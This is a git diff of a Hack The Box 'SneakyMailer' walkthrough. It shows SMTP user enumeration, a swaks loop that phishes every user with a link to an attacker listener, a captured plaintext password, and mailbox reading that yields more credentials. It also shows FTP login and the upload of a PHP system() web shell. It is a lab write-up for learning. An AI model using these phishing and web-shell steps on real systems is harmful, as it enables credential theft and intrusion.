@@ -275,13 +275,23 @@ Tried to register again
 
 ![](../../.gitbook/assets/4-dev-sneakycorp-8080.png)
 
-Decided to check out the port 8080 on each of the virtual hosts, dev did not lead anywhere, but pypi did: [http://pypi.sneakycorp.htb:8080/](http://pypi.sneakycorp.htb:8080/)
+Decided to check out the port 8080 on each of the virtual hosts, dev did not lead anywhere
+
+![](../../.gitbook/assets/4-pypi-sneakycorp-8080.png)
+
+, but pypi did: [http://pypi.sneakycorp.htb:8080/](http://pypi.sneakycorp.htb:8080/)
+
+![](../../.gitbook/assets/4-pypi-sneakycorp-8080-old.png)
 
 found pypiserver version 1.3.2 - newest is 1.4.2
 
+![](../../.gitbook/assets/4-pypi-sneakycorp-8080-auth.png)
+
+
+
 [https://blog.pentesteracademy.com/learn-to-interact-with-pypi-server-in-3-minutes-71d45fa46273](https://blog.pentesteracademy.com/learn-to-interact-with-pypi-server-in-3-minutes-71d45fa46273)
 
-
+### Verifying valid email addresses
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/sneakymailer]
@@ -320,7 +330,7 @@ QUIT
 Connection closed by foreign host.
 ```
 
-[https://www.interserver.net/tips/kb/check-email-address-really-exists-without-sending-email/](https://www.interserver.net/tips/kb/check-email-address-really-exists-without-sending-email/) [https://www.mailenable.com/kb/content/article.asp?ID=ME020207](https://www.mailenable.com/kb/content/article.asp?ID=ME020207) Sent an email to my personal tester greer-nanka... tested a few addresses, all seem valid
+[https://www.interserver.net/tips/kb/check-email-address-really-exists-without-sending-email/](https://www.interserver.net/tips/kb/check-email-address-really-exists-without-sending-email/) [https://www.mailenable.com/kb/content/article.asp?ID=ME020207](https://www.mailenable.com/kb/content/article.asp?ID=ME020207) Sent an email to my personal tester greer-san... tested a few addresses, all seem valid
 
 ```text
 msf5 exploit(multi/handler) > use smtp_enum
@@ -367,13 +377,16 @@ msf5 auxiliary(scanner/smtp/smtp_enum) > run
 
 verified all the usernames
 
-[https://github.com/jetmore/swaks](https://github.com/jetmore/swaks)
+### Sending a phishing email with SMTP
 
-clean this up, remove extra data, add first email address and snipped...
+Searched how to interact with SMTP through command line - [https://github.com/jetmore/swaks](https://github.com/jetmore/swaks)
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/sneakymailer]
-└─$ for address in $(cat users); do swaks --helo sneakycorp.htb --to $address --from zweilos@sneakymailer.htb --header "Subject: Check this out" --body "Check this out! http://10.10.15.100:8090/" --server 10.10.10.197; done  
+└─$ for address in $(cat users); do swaks --helo sneakycorp.htb \
+--to $address --from zweilos@sneakymailer.htb --header "Subject: Check this out" \
+--body "Check this out! http://10.10.15.100:8090/" --server 10.10.10.197; done
+  
 === Trying 10.10.10.197:25...
 === Connected to 10.10.10.197.
 <-  220 debian ESMTP Postfix (Debian/GNU)
@@ -452,7 +465,9 @@ no reply, so maybe try working local address? also put the "link" on a new line 
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/sneakymailer]
-└─$ for address in $(cat users); do swaks --helo sneakycorp.htb --to $address --from root@sneakymailer.htb --header "Subject: Check this out" --body "Check this out! \nhttp://10.10.15.100:8090/" --server 10.10.10.197; done 
+└─$ for address in $(cat users); do swaks --helo sneakycorp.htb \
+--to $address --from root@sneakymailer.htb --header "Subject: Check this out" \
+--body "Check this out. \nhttp://10.10.15.100:8090/" --server 10.10.10.197; done 
 
 === Trying 10.10.10.197:25...
 === Connected to 10.10.10.197.
@@ -572,6 +587,12 @@ no reply, so maybe try working local address? also put the "link" on a new line 
 
 going to try restting box since getting no replies to phishing email, also remove `!` from body to see if that causing issues
 
+![](../../.gitbook/assets/5-password-capture1.png)
+
+Was doing packet capture the whole time trying to see if my messages were being sent/recieved, and finally got a reply back from one
+
+![](../../.gitbook/assets/5-password-capture.png)
+
 ```text
 ┌──(zweilos㉿kali)-[~/htb/sneakymailer]
 └─$ nc -lvnp 8090                                                                                  1 ⨯
@@ -595,13 +616,27 @@ Got a click! The user Paul Byrd clicked on my link and gave me a \(URL-encoded\)
 firstName=Paul&lastName=Byrd&email=paulbyrd@sneakymailer.htb&password=^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht&rpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
 ```
 
-This decodes to give me a password of
+This decoded to give me a \(super-complicated\) password of:
 
 ```text
 ^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
 ```
 
-Since Paul was nice enough to send me his email pasword, I decided to log into his mailbox to see what kind of information I could find
+### Reading Paul's mail
+
+Since Paul was nice enough to send me his email password, I decided to log into his mailbox to see what kind of information I could find
+
+![](../../.gitbook/assets/6-thunderbyrd.png)
+
+I put in the account information for Paul into my email client and pointed the server towards the target.
+
+![](../../.gitbook/assets/6-thunderbyrd-sent1.png)
+
+After logging into the mailbox I noticed there wasn't anything in the inbox \(probably emptied regularly to keep other players from accidentally clicking on each other's phishing email links\).  There were two messages in the `Sent items` folder, however.  The first was an email to the administrator `root@debian` asking them to change the password for the `developer` account.  He was nice enough to send the old password `m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C` as well.  I made sure to take note of this in case it was used anywhere, or in case the admin hadn't changed it yet.
+
+![](../../.gitbook/assets/6-thunderbyrd-sent2.png)
+
+The second email was addressed to `low`, which I thought was another potential username on the machine.  The message laid out a task to "install, test, and then erase" all of the modules in the PyPI service.  I hoped that perhaps Paul had created a script to automate this action, and that I could possibly get it to execute a module I somehow got installed to the service.
 
 ```text
 Hello administrator, I want to change this password for the developer account
@@ -612,7 +647,19 @@ Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
 Please notify me when you do it
 ```
 
-Now I had developer creds, this could most likely log into tthe pypi server I found earlier. This did not work, nor did logging into SSH. I checked back with my nmap to see if there were any other services I could try, and noticed port 21 - FTP was open, so I gave it a try
+Since I now had credentials, I though it would most likely log into the PyPI server I found earlier.  
+
+![](../../.gitbook/assets/8-pypi-loggged-in.png)
+
+nothing in packages
+
+![](../../.gitbook/assets/8-pypi-loggged-in2.png)
+
+nor in the index page
+
+However, this did not work, nor did logging into SSH.  I checked back with my nmap scan to see if there were any other services I could try, and noticed port 21 - FTP was open, so I gave it a try.
+
+### FTP Enumeration
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/sneakymailer]
@@ -625,6 +672,11 @@ Password:
 230 Login successful.
 Remote system type is UNIX.
 Using binary mode to transfer files.
+```
+
+Using the credentials I had found for the `delevoper` account I was able to login through FTP.
+
+```text
 ftp> ls
 200 PORT command successful. Consider using PASV.
 150 Here comes the directory listing.
@@ -689,33 +741,8 @@ ftp> ls
 226 Directory send OK.
 ftp> cd ../
 250 Directory successfully changed.
-ftp> ls
-200 PORT command successful. Consider using PASV.
-150 Here comes the directory listing.
-drwxr-xr-x    4 0        0            4096 May 26 18:52 bootstrap
-drwxr-xr-x    2 0        0            4096 May 26 18:52 chart.js
-drwxr-xr-x    2 0        0            4096 May 26 18:52 datatables
-drwxr-xr-x   10 0        0            4096 May 26 18:52 fontawesome-free
-drwxr-xr-x    2 0        0            4096 May 26 18:52 jquery
-drwxr-xr-x    2 0        0            4096 May 26 18:52 jquery-easing
-226 Directory send OK.
 ftp> cd ..
 \250 Directory successfully changed.
-ftp> ls
-200 PORT command successful. Consider using PASV.
-150 Here comes the directory listing.
-drwxr-xr-x    2 0        0            4096 May 26 18:52 css
-drwxr-xr-x    2 0        0            4096 May 26 18:52 img
--rwxr-xr-x    1 0        0           13742 Jun 23 08:44 index.php
-drwxr-xr-x    3 0        0            4096 May 26 18:52 js
-drwxr-xr-x    2 0        0            4096 May 26 18:52 pypi
-drwxr-xr-x    4 0        0            4096 May 26 18:52 scss
--rwxr-xr-x    1 0        0           26523 May 26 19:58 team.php
-drwxr-xr-x    8 0        0            4096 May 26 18:52 vendor
-226 Directory send OK.
-ftp> cd
-(remote-directory) 
-usage: cd remote-directory
 ftp> get index.php
 local: index.php remote: index.php
 200 PORT command successful. Consider using PASV.
@@ -764,7 +791,7 @@ ftp> ls
 226 Directory send OK.
 ```
 
-I was able to successfully login, and began looking around. It appeared as if the ftp server location was the same as the webhost. I exfiltrated some of the files to my machine for further analysis. None of the files seemed to have anything interesting in them.
+I was able to successfully login, and began looking around. It appeared as if the ftp server location and files were the same as the live website. I exfiltrated some of the files to my machine for further analysis, but none of the files seemed to have anything interesting in them.
 
 ```text
 ftp> put php-code-exec.php
@@ -799,9 +826,19 @@ system($var);
 ?>
 ```
 
-Using this I was able to identify that I was running in the context of www-data, and that there were three users that could log into the machine: low, developer, and root
-
 ## Initial Foothold
+
+![](../../.gitbook/assets/7-code-exec.png)
+
+Using this I was able to identify that I was running in the context of www-data
+
+![](../../.gitbook/assets/7-etc-passwd.png)
+
+, and that there were three users that could log into the machine: low, developer, and root
+
+![](../../.gitbook/assets/7-ssh-key.png)
+
+Next I tried adding my public SSH key to both `low` and `developer` since they could log in, but was unable to gain access with SSH since `www-data` could not write to those files.
 
 ## Road to User
 
@@ -857,7 +894,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 sneakymailer
 ```
 
-snarted enumeration
+started enumeration
 
 ```text
 www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ ls -la
